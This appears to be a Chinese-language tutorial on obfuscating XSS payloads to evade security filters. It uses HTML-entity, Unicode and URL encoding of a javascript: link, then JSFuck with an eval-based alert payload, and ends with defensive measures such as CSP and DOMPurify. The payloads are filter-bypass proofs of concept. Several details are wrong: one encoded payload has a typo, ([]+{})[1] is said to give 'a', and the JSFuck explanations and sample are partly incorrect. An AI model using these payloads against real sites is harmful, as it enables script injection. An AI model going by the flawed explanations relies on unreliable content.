# 混淆编码

``` html
<a
    href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74:\u0061\u006c\u0065\u0072\u0074 (/xss/)"
>test</a>
```

`&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;`使用html编码，解析成javascript

`\u0061\u006c\u0065\u0072\u0074`Unicode编码，编码成`alert`

## 二层混淆

二层混淆就是对XSS代码在遵循浏览器解码规则的情况下进行两次编码，让防护软件无法理解XSS代码，进而绕过防护软件

一定要遵循浏览器的规则才可以确保代码能够被浏览器理解

``` html
<a
    href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;8#x72;&#x69;&#x70;&#x74;:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(/xss/)"
>test</a>
```

先看编码过程

先Unicode编码，再URL编码

### 三层混淆

在二层混淆基础上再一层（HTML编码）


## JSFuck

### 类型转换

JS语法中==两边如果不是同一类型则会进行类型转换

`Boolean([])/true,Boolean(![])/false`

上述代码，我们进行了强制转换，在js中在把对象做布尔值转换的时候，会把所有对象都转换为true

原题变为空数组==false→空数组==0→0==0→返回True

### 基础字符表示法

JSFuck 利用 JavaScript 中的隐式类型转换，能够将最基本的值如 true、false、undefined、NaN、Infinity 等用 +、! 和 [] 等符号表示出来。下面是一些常见的例子：

- true: !![]，利用逻辑非运算符 ! 进行两次取反，空数组 [] 被视为 true，所以 !![] 得到 true。
- false: ![]，空数组取反。
- undefined: 通过对 [] 的类型 [[]][+[]]（也就是 Array 类型加上空字符串转换为 undefined）。
- NaN: +[![]]，对 false 进行加法运算得到 NaN。
- Infinity: +[+!![]] / +[]，通过对 true 转换后的 1 再除以 0，得到 Infinity。

### 数字
- 0 可以通过 +[] 表示
    - +[] 是对空数组执行加法运算，会将其转换为数字 0。
- 1 可以通过 +!![] 表示。
    - !![] 是 true，对其执行加法运算，结果为 1。

### 字符串
字符串的字符可以通过类型转换和索引访问来生成。例如：

'a' 可以通过 ([]+{})[1] 得到。

[]+{} 是将空数组和空对象连接，结果是字符串 "[object Object]"。

([object Object])[1] 取第一个字符 'a'。

###  生成 JavaScript 代码

``` javascript
eval('alert("Hello, World!")')
```

``` javascript
[][(![]+[])[+!![]]+(![]+[])[+[]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]]+([]+{})[!+[]+!![]+!![]+!![]]][([][[]]+[])[+[]]+(![]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]]('alert("Hello, World!")')()
```

## 防范措施
为了防止这种利用 JSFuck 进行的 XSS 攻击，建议采取以下安全措施：

- 使用安全编码库：使用可信的库（如 OWASP 的 ESAPI 或 DOMPurify）对用户输入进行过滤和转义，而不是手动编写正则表达式进行过滤。
- 内容安全策略 (CSP)：设置 HTTP 头中的 Content-Security-Policy，以限制网页可以执行的脚本源，从而阻止恶意脚本的执行。
- 输入验证和输出编码：在用户输入的每一个环节进行严格的验证和转义，尤其是在输出到浏览器时，确保特殊字符不会被直接解析成 HTML 或 JavaScript 代码。
- 避免使用 eval 或类似功能：尽量避免在代码中使用 eval、setTimeout、setInterval 等可以执行字符串代码的函数，因为它们很容易被恶意代码利用。